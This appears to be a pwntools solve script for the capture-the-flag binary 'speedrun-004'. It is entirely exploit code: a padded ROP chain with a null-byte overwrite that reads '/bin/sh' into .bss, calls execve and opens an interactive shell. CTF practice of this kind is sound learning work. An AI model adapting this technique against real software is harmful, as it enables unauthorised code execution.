from pwn import *

context(arch='amd64')

p = process('./speedrun-004')

#gdb.attach(p, '''
#        break * 0x0000000000400bd0
#        continue
#        ''')

p.sendlineafter(b'say?\n', b'257')

elf = ELF('./speedrun-004')
rop = ROP('./speedrun-004')

syscall_addr = 0x0000000000474f15
read_addr = 0x000000000044A140
ret_addr = 0x0000000000400416
pop_rax_addr = 0x0000000000415f04
comm_addr = elf.bss(0x100)

rop.call(read_addr, [constants.STDIN_FILENO, comm_addr, 0x10])

rop.raw(pop_rax_addr)
rop.raw(59)

rop.call(syscall_addr, [comm_addr, 0, 0])

rop_chain = rop.chain()

log.info(f'ROP chain size: {len(rop_chain)}')

padding = p64(ret_addr) * ((0x100 - len(rop_chain))//8)
overwrite = b'\x00'

payload = padding + rop_chain + overwrite

p.sendafter(b'yourself?\n', payload)

p.sendafter(b'consideration.\n', b'/bin/sh\x00')

p.interactive()
